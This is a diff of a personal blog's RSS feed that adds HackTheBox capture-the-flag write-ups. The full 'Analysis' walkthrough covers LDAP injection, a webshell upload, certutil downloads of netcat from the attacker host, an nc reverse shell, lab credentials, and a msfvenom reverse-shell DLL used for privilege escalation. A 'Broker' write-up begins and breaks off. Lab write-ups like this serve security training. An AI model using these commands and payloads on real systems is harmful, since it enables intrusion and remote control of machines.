@@ -1,246 +1,2570 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Mil4ne</title><description>hola</description><link>https://fuwari.vercel.app/</link><language>en</language><item><title>Draft Example</title><link>https://fuwari.vercel.app/posts/draft/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/draft/</guid><pubDate>Fri, 01 Jul 2022 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;This Article is a Draft&lt;/h1&gt;
-&lt;p&gt;This article is currently in a draft state and is not published. Therefore, it will not be visible to the general audience. The content is still a work in progress and may require further editing and review.&lt;/p&gt;
-&lt;p&gt;When the article is ready for publication, you can update the &quot;draft&quot; field to &quot;false&quot; in the Frontmatter:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;---
-title: Draft Example
-published: 2024-01-11T04:40:26.381Z
-tags: [Markdown, Blogging, Demo]
-category: Examples
-draft: false
----
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Mil4ne</title><description>hola</description><link>https://fuwari.vercel.app/</link><language>en</language><item><title>Analysis HTB Writeup</title><link>https://fuwari.vercel.app/posts/analysis/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/analysis/</guid><description>Hard Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;We start our scans with nmap.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap -sS -p- --open --min-rate 3000 -n -Pn -vvv 10.10.11.250 -oN Nmap 
+
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+80/tcp    open  http             syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+3306/tcp  open  mysql            syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+33060/tcp open  mysqlx           syn-ack ttl 127
+47001/tcp open  winrm            syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49665/tcp open  unknown          syn-ack ttl 127
+49666/tcp open  unknown          syn-ack ttl 127
+49667/tcp open  unknown          syn-ack ttl 127
+49671/tcp open  unknown          syn-ack ttl 127
+49674/tcp open  unknown          syn-ack ttl 127
+49675/tcp open  unknown          syn-ack ttl 127
+49676/tcp open  unknown          syn-ack ttl 127
+49677/tcp open  unknown          syn-ack ttl 127
+49682/tcp open  unknown          syn-ack ttl 127
+49732/tcp open  unknown          syn-ack ttl 127
+63270/tcp open  unknown          syn-ack ttl 127
 &lt;/code&gt;&lt;/pre&gt;
-</content:encoded></item><item><title>Simple Guides for Fuwari</title><link>https://fuwari.vercel.app/posts/guide/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/guide/</guid><description>How to use this blog template.</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;blockquote&gt;
-&lt;p&gt;Cover image source: &lt;a href=&quot;https://image.civitai.com/xG1nkqKTMzGDvpLrqFT7WA/208fc754-890d-4adb-9753-2c963332675d/width=2048/01651-1456859105-(colour_1.5),girl,_Blue,yellow,green,cyan,purple,red,pink,_best,8k,UHD,masterpiece,male%20focus,%201boy,gloves,%20ponytail,%20long%20hair,.jpeg&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;This blog template is built with &lt;a href=&quot;https://astro.build/&quot;&gt;Astro&lt;/a&gt;. For the things that are not mentioned in this guide, you may find the answers in the &lt;a href=&quot;https://docs.astro.build/&quot;&gt;Astro Docs&lt;/a&gt;.&lt;/p&gt;
-&lt;h2&gt;Front-matter of Posts&lt;/h2&gt;
-&lt;pre&gt;&lt;code&gt;---
-title: My First Blog Post
-published: 2023-09-09
-description: This is the first post of my new Astro blog.
-image: ./cover.jpg
-tags: [Foo, Bar]
-category: Front-end
-draft: false
----
+&lt;h3&gt;Nmap version Scan&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3306,5985,9389,33060,47001,49664,49665,49666,49667,49671,49674,49675,49676,49677,49682,49732,6327 -sCV 10.10.11.250 -oN Ports
+
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-05 19:49 EDT
+Nmap scan report for 10.10.11.250 (10.10.11.250)
+Host is up (0.11s latency).
+
+PORT      STATE  SERVICE       VERSION
+53/tcp    open   domain        Simple DNS Plus
+80/tcp    open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-05 23:55:03Z)
+135/tcp   open   msrpc         Microsoft Windows RPC
+139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
+445/tcp   open   microsoft-ds?
+464/tcp   open   kpasswd5?
+593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open   tcpwrapped
+3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
+3269/tcp  open   tcpwrapped
+3306/tcp  open   mysql         MySQL (unauthorized)
+5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+6327/tcp  closed unknown
+9389/tcp  open   mc-nmf        .NET Message Framing
+33060/tcp open   mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, X11Probe: 
+|     Invalid message&quot;
+|     HY000
+|   LDAPBindReq: 
+|     *Parse error unserializing protobuf message&quot;
+|     HY000
+|   oracle-tns: 
+|     Invalid message-frame.&quot;
+|_    HY000
+47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open   msrpc         Microsoft Windows RPC
+49665/tcp open   msrpc         Microsoft Windows RPC
+49666/tcp open   msrpc         Microsoft Windows RPC
+49667/tcp open   msrpc         Microsoft Windows RPC
+49671/tcp open   msrpc         Microsoft Windows RPC
+49674/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49675/tcp open   msrpc         Microsoft Windows RPC
+49676/tcp open   msrpc         Microsoft Windows RPC
+49677/tcp open   msrpc         Microsoft Windows RPC
+49682/tcp open   msrpc         Microsoft Windows RPC
+49732/tcp open   msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.94SVN%I=7%D=6/5%Time=6660F9B2%P=x86_64-pc-linux-gnu%r
+SF:(GenericLines,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(GetRequest,9,&quot;\x05\0\
+SF:0\0\x0b\x08\x05\x1a\0&quot;)%r(HTTPOptions,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)
+SF:%r(RTSPRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(RPCCheck,9,&quot;\x05\0\0
+SF:\0\x0b\x08\x05\x1a\0&quot;)%r(DNSVersionBindReqTCP,9,&quot;\x05\0\0\0\x0b\x08\x05
+SF:\x1a\0&quot;)%r(DNSStatusRequestTCP,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0
+SF:\0\x01\x08\x01\x10\x88&apos;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(Help,9
+SF:,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SSLSessionReq,2B,&quot;\x05\0\0\0\x0b\x08
+SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&apos;\x1a\x0fInvalid\x20message\&quot;\x
+SF:05HY000&quot;)%r(TerminalServerCookie,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(Ke
+SF:rberos,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SMBProgNeg,9,&quot;\x05\0\0\0\x0b
+SF:\x08\x05\x1a\0&quot;)%r(X11Probe,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\
+SF:x01\x08\x01\x10\x88&apos;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(FourOhFou
+SF:rRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LPDString,9,&quot;\x05\0\0\0\x0
+SF:b\x08\x05\x1a\0&quot;)%r(LDAPSearchReq,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\
+SF:0\0\0\x01\x08\x01\x10\x88&apos;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(LDA
+SF:PBindReq,46,&quot;\x05
 &lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;&amp;lt;img src=&quot;img/1.png&quot; alt=&quot;&quot;&amp;gt;&lt;/p&gt;
+&lt;p&gt;we try to run whatweb:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; whatweb http://analysis.htb/ 
+http://analysis.htb/ [200 OK] Country[RESERVED][ZZ], Email[mail@demolink.org,privacy@demolink.org], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.250], JQuery, Microsoft-IIS[10.0], Script[text/javascript]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We try to fuzz to find subdirectories:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;gobuster dir -u http://analysis.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;lt;img src=&quot;img/2.png&quot; alt=&quot;&quot;&amp;gt;&lt;/p&gt;
+&lt;p&gt;But we don&apos;t see anything interesting.&lt;/p&gt;
+&lt;p&gt;We can try to look for subdomains:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ffuf -u http://10.10.11.250 -H &quot;Host: FUZZ.analysis.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;lt;img src=&quot;img/3.png&quot; alt=&quot;&quot;&amp;gt;&lt;/p&gt;
+&lt;p&gt;&amp;lt;img src=&quot;img/4.png&quot; alt=&quot;&quot;&amp;gt;&lt;/p&gt;
+&lt;p&gt;we fuzz this new subdomain:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb -t 55
+
+/users                (Status: 301) [Size: 170] [--&amp;gt; http://internal.analysis.htb/users/]
+/dashboard            (Status: 301) [Size: 174] [--&amp;gt; http://internal.analysis.htb/dashboard/]
+/Users                (Status: 301) [Size: 170] [--&amp;gt; http://internal.analysis.htb/Users/]
+/employees            (Status: 301) [Size: 174] [--&amp;gt; http://internal.analysis.htb/employees/]
+/Dashboard            (Status: 301) [Size: 174] [--&amp;gt; http://internal.analysis.htb/Dashboard/]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can also filter by php extensions in these subdirectories:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;users&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb/users/ -t 55 -x php
+
+/list.php             (Status: 200) [Size: 17]
+/List.php             (Status: 200) [Size: 17]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;dashboard&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb/dashboard/ -t 55 -x php
+
+/img                  (Status: 301) [Size: 178] [--&amp;gt; http://internal.analysis.htb/dashboard/img/]
+/index.php            (Status: 200) [Size: 38]
+/uploads              (Status: 301) [Size: 182] [--&amp;gt; http://internal.analysis.htb/dashboard/uploads/]
+/upload.php           (Status: 200) [Size: 0]
+/details.php          (Status: 200) [Size: 35]
+/css                  (Status: 301) [Size: 178] [--&amp;gt; http://internal.analysis.htb/dashboard/css/]
+/Index.php            (Status: 200) [Size: 38]
+/lib                  (Status: 301) [Size: 178] [--&amp;gt; http://internal.analysis.htb/dashboard/lib/]
+/form.php             (Status: 200) [Size: 35]
+/js                   (Status: 301) [Size: 177] [--&amp;gt; http://internal.analysis.htb/dashboard/js/]
+/logout.php           (Status: 302) [Size: 3] [--&amp;gt; ../employees/login.php]
+/tickets.php          (Status: 200) [Size: 35]
+/emergency.php        (Status: 200) [Size: 35]
+/IMG                  (Status: 301) [Size: 178] [--&amp;gt; http://internal.analysis.htb/dashboard/IMG/]
+/INDEX.php            (Status: 200) [Size: 38]
+/Details.php          (Status: 200) [Size: 35]
+/Form.php             (Status: 200) [Size: 35]
+/CSS                  (Status: 301) [Size: 178] [--&amp;gt; http://internal.analysis.htb/dashboard/CSS/]
+/Img                  (Status: 301) [Size: 178] [--&amp;gt; http://internal.analysis.htb/dashboard/Img/]
+/JS                   (Status: 301) [Size: 177] [--&amp;gt; http://internal.analysis.htb/dashboard/JS/]
+/Upload.php           (Status: 200) [Size: 0]
+/Uploads              (Status: 301) [Size: 182] [--&amp;gt; http://internal.analysis.htb/dashboard/Uploads/]
+/Logout.php           (Status: 302) [Size: 3] [--&amp;gt; ../employees/login.php]
+/Lib                  (Status: 301) [Size: 178] [--&amp;gt; http://internal.analysis.htb/dashboard/Lib/]
+/Tickets.php          (Status: 200) [Size: 35]
+/Emergency.php        (Status: 200) [Size: 35]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;employes&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb/employees/ -t 55 -x php
+
+
+/login.php            (Status: 200) [Size: 1085]
+/Login.php            (Status: 200) [Size: 1085]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;if we do a curl to &lt;code&gt;http://internal.analysis.htb/users/list.php&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl -s http://internal.analysis.htb/users/list.php
+
+missing parameter
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Fuzzing to find the required parameter in the URL&lt;/h3&gt;
+&lt;p&gt;we see that the URL needs a parameter, so we will fuzz this parameter:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u &apos;http://internal.analysis.htb/users/list.php?FUZZ&apos; -fs 17
+
+
+name                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 9807ms]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;where we find the parameter called name. So we have the file with the parameter &lt;code&gt;http://internal.analysis.htb/users/list.php?name&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&amp;lt;img src=&quot;img/5.png&quot; alt=&quot;&quot;&amp;gt;&lt;/p&gt;
+&lt;h3&gt;LDAP Injection&lt;/h3&gt;
+&lt;p&gt;Remember that the LDAP service was running on this machine. Looking for LDAP Injections in HackTricks, we could try something like name=* to see if this returns something. If I visit http://internal.analysis.htb/users/list.php?name=* to try an injection, I can see a user:&lt;/p&gt;
+&lt;p&gt;&amp;lt;img src=&quot;img/6.png&quot; alt=&quot;&quot;&amp;gt;&lt;/p&gt;
+&lt;h2&gt;Script for LDAP Injection&lt;/h2&gt;
+&lt;p&gt;Let&apos;s create a script in C++ to automate the LDAP injection&lt;/p&gt;
+&lt;p&gt;First, we install what we need:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo apt-get install libcurl4-openssl-dev libargparse-dev
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;here is our script: https://github.com/mil4ne/auto-LDAP-Injection&lt;/p&gt;
+&lt;p&gt;We compile:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ ldap.c++ -o ejecutable -I. -lcurl
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then we run the script:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./ejecutable -u &quot;http://internal.analysis.htb/users/list.php?name&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Our final result is this &lt;code&gt;97NTtl*4QP96Bv&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;with the found credentials, we go to the panel we found earlier:
+&lt;code&gt;http://internal.analysis.htb/employees/login.php&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&amp;lt;img src=&quot;img/7.png&quot; alt=&quot;&quot;&amp;gt;&lt;/p&gt;
+&lt;p&gt;here is a section called &lt;code&gt;SOC Report&lt;/code&gt; where we can upload a file:&lt;/p&gt;
+&lt;p&gt;&amp;lt;img src=&quot;img/8.png&quot; alt=&quot;&quot;&amp;gt;&lt;/p&gt;
+&lt;h3&gt;WebShell upload&lt;/h3&gt;
+&lt;p&gt;let&apos;s get a webshell to our attacker machine, to upload it to the web:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After uploading it, we will find it at: &lt;code&gt;http://internal.analysis.htb/dashboard/uploads/webshell.php&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;now we will upload netcat to the victim machine to send ourselves a revshell:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python3 -m http.server
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;lt;img src=&quot;img/9.png&quot; alt=&quot;&quot;&amp;gt;&lt;/p&gt;
+&lt;p&gt;with certutil.exe we download the nc with the help of our webshell:&lt;/p&gt;
+&lt;p&gt;&amp;lt;img src=&quot;img/10.png&quot; alt=&quot;&quot;&amp;gt;&lt;/p&gt;
+&lt;p&gt;we put ourselves on listen mode:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; rlwrap -cAr nc -lvnp 4444
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We send the revshell:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;C:\Users\Public\Downloads\nc.exe 10.10.14.166 4444 -e C:\Windows\System32\cmd.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We now have a shell&lt;/p&gt;
+&lt;p&gt;&amp;lt;img src=&quot;img/11.png&quot; alt=&quot;&quot;&amp;gt;&lt;/p&gt;
+&lt;p&gt;we transfer winpeas to our victim machine:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;certutil.exe -urlcache -split -f http://10.10.14.166:8000/winPEASx64.exe C:\Users\Public\Downloads\win.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We run it:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;C:\Users\Public\Downloads\win.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Movimiento Lateral&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;In our result we find credentials:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  analysis.htb.
+    DefaultUserName               :  jdoe
+    DefaultPassword               :  7y4Z4^*y9Zzj
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;we try to see if this user is valid to connect via &lt;code&gt;evil-winrm&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; crackmapexec winrm 10.10.11.250 -u &apos;jdoe&apos; -p &apos;7y4Z4^*y9Zzj&apos; 
+SMB         10.10.11.250    5985   DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 (name:DC-ANALYSIS) (domain:analysis.htb)
+HTTP        10.10.11.250    5985   DC-ANALYSIS      [*] http://10.10.11.250:5985/wsman
+WINRM       10.10.11.250    5985   DC-ANALYSIS      [+] analysis.htb\jdoe:7y4Z4^*y9Zzj (Pwn3d!)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;it is valid.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;evil-winrm -i 10.10.11.250 -u &apos;jdoe&apos; -p &apos;7y4Z4^*y9Zzj&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;if we run winpeas again we can see the following:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Evil-WinRM* PS C:\Users\jdoe\Documents&amp;gt; C:\Users\jdoe\Documents\winpeas.exe
+
+&amp;lt;SNIP&amp;gt;
+Snort(Snort)[C:\Snort\bin\snort.exe /SERVICE] - Autoload - No quotes and Space detected
+    Possible DLL Hijacking in binary folder: C:\Snort\bin (Users [AppendData/CreateDirectories WriteData/CreateFiles])
+
+&amp;lt;SNIP&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So SNORT is a tool for intrusion prevention and, I assume, it must run with some kind of privileges for it. It seems that attacking the SNORT service could be a potential path for privilege escalation.&lt;/p&gt;
+&lt;p&gt;Checking permissions with icacls shows that we are able to write to these files:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Evil-WinRM* PS C:\Users\jdoe\Documents&amp;gt; icacls C:\Snort\lib\snort_dynamicengine
+
+C:\Snort\lib\snort_dynamicengine AUTORITE NT\SystŠme:(I)(OI)(CI)(F)
+                                 BUILTIN\Administrateurs:(I)(OI)(CI)(F)
+                                 BUILTIN\Utilisateurs:(I)(OI)(CI)(RX)
+                                 BUILTIN\Utilisateurs:(I)(CI)(AD)
+                                 BUILTIN\Utilisateurs:(I)(CI)(WD)
+                                 CREATEUR PROPRIETAIRE:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+*Evil-WinRM* PS C:\Users\jdoe\Documents&amp;gt; icacls C:\Snort\lib\snort_dynamicpreprocessor
+
+C:\Snort\lib\snort_dynamicpreprocessor AUTORITE NT\SystŠme:(I)(OI)(CI)(F)
+                                       BUILTIN\Administrateurs:(I)(OI)(CI)(F)
+                                       BUILTIN\Utilisateurs:(I)(OI)(CI)(RX)
+                                       BUILTIN\Utilisateurs:(I)(CI)(AD)
+                                       BUILTIN\Utilisateurs:(I)(CI)(WD)
+                                       CREATEUR PROPRIETAIRE:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I notice that in this directory we have .dll files, so we can try a DLL hijacking:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\jdoe\Documents&amp;gt; cmd.exe /c dir C:\Snort\lib\snort_dynamicengine
+ Volume in drive C has no label.
+ Volume Serial Number is 0071-E237
+
+ Directory of C:\Snort\lib\snort_dynamicengine
+
+07/08/2023  03:31 PM    &amp;lt;DIR&amp;gt;          .
+07/08/2023  03:31 PM    &amp;lt;DIR&amp;gt;          ..
+05/24/2022  06:48 AM            78,336 sf_engine.dll
+               1 File(s)         78,336 bytes
+               2 Dir(s)   4,018,229,248 bytes free
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;To do this, we create a malicious &lt;code&gt;.dll&lt;/code&gt; file with &lt;code&gt;msfvenom&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9999 -f dll -a x64 -o nr.dll  
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Nos ponemos en escucha:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;rlwrap -cAr nc -lvnp 9999
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;then we go to the path C:\Snort\lib\snort_dynamicpreprocessor and within that directory we upload our malicious dll&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;upload nr.dll
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;In 1 minute we will have a shell as an administrator.&lt;/p&gt;
+</content:encoded></item><item><title>Broker HTB Writeup</title><link>https://fuwari.vercel.app/posts/broker/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/broker/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Broker is an easy difficulty Linux machine hosting a version of Apache ActiveMQ. Enumerating the version of Apache ActiveMQ shows that it is vulnerable to Unauthenticated Remote Code Execution, which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the system has a sudo misconfiguration allowing the activemq user to execute sudo /usr/sbin/nginx, which is similar to the recent Zimbra disclosure and is leveraged to gain root access.&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; ping -c 1 10.10.11.243   
+PING 10.10.11.243 (10.10.11.243) 56(84) bytes of data.
+64 bytes from 10.10.11.243: icmp_seq=1 ttl=63 time=139 ms
+
+--- 10.10.11.243 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 139.019/139.019/139.019/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;we start our scanning with nmap:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap -sC -sV -oA broker 10.10.11.243
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:754a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Error 401 Unauthorized
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  basic realm=ActiveMQRealm
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;In our result we can see 2 ports.&lt;/p&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
-&lt;th&gt;Attribute&lt;/th&gt;
-&lt;th&gt;Description&lt;/th&gt;
+&lt;th&gt;Port&lt;/th&gt;
+&lt;th&gt;Service&lt;/th&gt;
+&lt;th&gt;Product&lt;/th&gt;
+&lt;th&gt;Version&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
-&lt;td&gt;&lt;code&gt;title&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;The title of the post.&lt;/td&gt;
+&lt;td&gt;22&lt;/td&gt;
+&lt;td&gt;ssh&lt;/td&gt;
+&lt;td&gt;OpenSSH&lt;/td&gt;
+&lt;td&gt;8.9p1&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;&lt;code&gt;published&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;The date the post was published.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;description&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;A short description of the post. Displayed on index page.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;image&lt;/code&gt;&lt;/td&gt;
